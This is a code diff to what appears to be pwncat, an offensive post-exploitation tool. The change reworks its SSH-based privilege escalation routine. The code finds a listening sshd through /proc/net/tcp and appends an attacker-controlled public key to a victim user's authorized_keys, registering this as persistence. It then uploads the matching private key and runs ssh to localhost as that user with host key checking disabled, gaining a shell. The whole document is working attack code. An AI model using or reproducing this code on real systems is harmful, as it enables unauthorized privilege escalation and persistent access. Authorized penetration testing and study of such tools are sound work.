@@ -1,4 +1,5 @@
 #!/usr/bin/env python3
+import ipaddress
 from typing import Type, List, Tuple, Optional
 from prompt_toolkit.shortcuts import confirm
 from colorama import Fore
@@ -389,22 +390,33 @@ class Finder:
                     pwncat.victim.subprocess("pgrep 'sshd'", "r").read().strip() != b""
                 )
 
-        sshd_listening = False
-        sshd_address = None
-        netstat = (
-            pwncat.victim.subprocess(
-                "netstat -anotp 2>/dev/null | grep LISTEN | grep -v tcp6 | grep ':22'",
-                "r",
-            )
-            .read()
-            .strip()
-        )
-
-        if netstat != "":
-            # Remove repeated spaces
-            netstat = re.sub(b" +", b" ", netstat).split(b" ")
+        try:
+            with pwncat.victim.open("/proc/net/tcp", "r") as filp:
+                for line in filp.readlines()[1:]:
+                    line = line.strip().split()
+                    local_addr = line[1].split(":")
+                    remote_addr = line[2].split(":")
+                    local_addr = (
+                        (int(local_addr[0], 16)),
+                        (int(local_addr[1], 16)),
+                    )
+                    remote_addr = (
+                        (int(remote_addr[0], 16)),
+                        (int(remote_addr[1], 16)),
+                    )
+                    # Found the SSH socket! Save the listening address
+                    if local_addr[1] == 22 and remote_addr[0] == 0:
+                        sshd_listening = True
+                        sshd_address = str(ipaddress.ip_address(local_addr[0]))
+                        break
+                else:
+                    # We didn't find an SSH socket
+                    sshd_listening = False
+                    sshd_address = None
+        except (PermissionError, FileNotFoundError, IndexError):
+            # We couldn't verify one way or the other, just try it
             sshd_listening = True
-            sshd_address = netstat[3].split(b":")[0].decode("utf-8")
+            sshd_address = "0.0.0.0"
 
         used_technique = None
 
@@ -527,85 +539,87 @@ class Finder:
                 if not response:
                     raise PrivescError("user aborted key clobbering")
 
-        # If we don't already know a private key, then we need a writer
-        if privkey_path is None and not writers:
-            raise PrivescError("no writers available to add private keys")
+            # If we don't already know a private key, then we need a writer
+            if privkey_path is None and not writers:
+                raise PrivescError("no writers available to add private keys")
 
-        # Everything looks good so far. We are adding a new private key. so we
-        # need to read in the private key and public key, then add the public
-        # key to the user's authorized_keys. The next step will upload the
-        # private key in any case.
-        if privkey_path is None:
+            # Everything looks good so far. We are adding a new private key. so we
+            # need to read in the private key and public key, then add the public
+            # key to the user's authorized_keys. The next step will upload the
+            # private key in any case.
+            if privkey_path is None:
 
-            writer = writers[0]
+                writer = writers[0]
 
-            # Write our private key to a random location
-            with open(pwncat.victim.config["privkey"], "r") as src:
-                privkey = src.read()
+                # Write our private key to a random location
+                with open(pwncat.victim.config["privkey"], "r") as src:
+                    privkey = src.read()
 
-            with open(pwncat.victim.config["privkey"] + ".pub", "r") as src:
-                pubkey = src.read().strip()
+                with open(pwncat.victim.config["privkey"] + ".pub", "r") as src:
+                    pubkey = src.read().strip()
 
-            # Add our public key to the authkeys
-            authkeys.append(pubkey)
+                # Add our public key to the authkeys
+                authkeys.append(pubkey)
 
-            # Write the file
-            writer.method.write_file(
-                authkeys_path, ("\n".join(authkeys) + "\n").encode("utf-8"), writer
+                # Write the file
+                writer.method.write_file(
+                    authkeys_path, ("\n".join(authkeys) + "\n").encode("utf-8"), writer
+                )
+
+                if len(readers) == 0:
+                    # We couldn't read their authkeys, but log that we clobbered it.
+                    # The user asked us to. At least create an un-removable tamper
+                    # noting that we clobbered this file.
+                    pwncat.victim.tamper.modified_file(authkeys_path)
+
+                # We now have a persistence method for this user no matter where
+                # we are coming from. We need to track this.
+                pwncat.victim.persist.register("authorized_keys", writer.user)
+
+                used_technique = writer
+
+            # SSH private keys are annoying and **NEED** a newline
+            privkey = privkey.strip() + "\n"
+
+            with pwncat.victim.tempfile("w", length=len(privkey)) as dst:
+                # Write the file with a nice progress bar
+                dst.write(privkey)
+                # Save the path to the private key. We don't need the original path,
+                # if there was one, because the current user can't access the old
+                # one directly.
+                privkey_path = dst.name
+
+            # Log that we created a file
+            pwncat.victim.tamper.created_file(privkey_path)
+
+            # Ensure the permissions are right so ssh doesn't freak out
+            pwncat.victim.run(f"chmod 600 {privkey_path}")
+
+            # Run ssh as the given user with our new private key
+            util.progress(
+                f"attempting {Fore.RED}ssh{Fore.RESET} to "
+                f"localhost as {Fore.GREEN}{techniques[0].user}{Fore.RESET}"
             )
+            ssh = pwncat.victim.which("ssh")
 
-            if len(readers) == 0:
-                # We couldn't read their authkeys, but log that we clobbered it.
-                # The user asked us to. At least create an un-removable tamper
-                # noting that we clobbered this file.
-                pwncat.victim.tamper.modified_file(authkeys_path)
+            # First, run a test to make sure we authenticate
+            command = (
+                f"{ssh} -i {privkey_path} -o StrictHostKeyChecking=no -o PasswordAuthentication=no "
+                f"{techniques[0].user}@127.0.0.1"
+            )
+            output = pwncat.victim.run(f"{command} echo good")
 
-            # We now have a persistence method for this user no matter where
-            # we are coming from. We need to track this.
-            pwncat.victim.persist.register("authorized_keys", writer.user)
+            # Check if we succeeded
+            if b"good" not in output:
+                raise PrivescError("ssh private key failed")
 
-            used_technique = writer
+            # Great! Call SSH again!
+            pwncat.victim.process(command)
 
-        # SSH private keys are annoying and **NEED** a newline
-        privkey = privkey.strip() + "\n"
+            # Pretty sure this worked!
+            return used_technique, "exit"
 
-        with pwncat.victim.tempfile("w", length=len(privkey)) as dst:
-            # Write the file with a nice progress bar
-            dst.write(privkey)
-            # Save the path to the private key. We don't need the original path,
-            # if there was one, because the current user can't access the old
-            # one directly.
-            privkey_path = dst.name
-
-        # Log that we created a file
-        pwncat.victim.tamper.created_file(privkey_path)
-
-        # Ensure the permissions are right so ssh doesn't freak out
-        pwncat.victim.run(f"chmod 600 {privkey_path}")
-
-        # Run ssh as the given user with our new private key
-        util.progress(
-            f"attempting {Fore.RED}ssh{Fore.RESET} to "
-            f"localhost as {Fore.GREEN}{techniques[0].user}{Fore.RESET}"
-        )
-        ssh = pwncat.victim.which("ssh")
-
-        # First, run a test to make sure we authenticate
-        command = (
-            f"{ssh} -i {privkey_path} -o StrictHostKeyChecking=no -o PasswordAuthentication=no "
-            f"{techniques[0].user}@127.0.0.1"
-        )
-        output = pwncat.victim.run(f"{command} echo good")
-
-        # Check if we succeeded
-        if b"good" not in output:
-            raise PrivescError("ssh private key failed")
-
-        # Great! Call SSH again!
-        pwncat.victim.process(command)
-
-        # Pretty sure this worked!
-        return used_technique, "exit"
+        raise PrivescError(f"unable to achieve shell as {techniques[0].user}")
 
     def escalate(
         self,
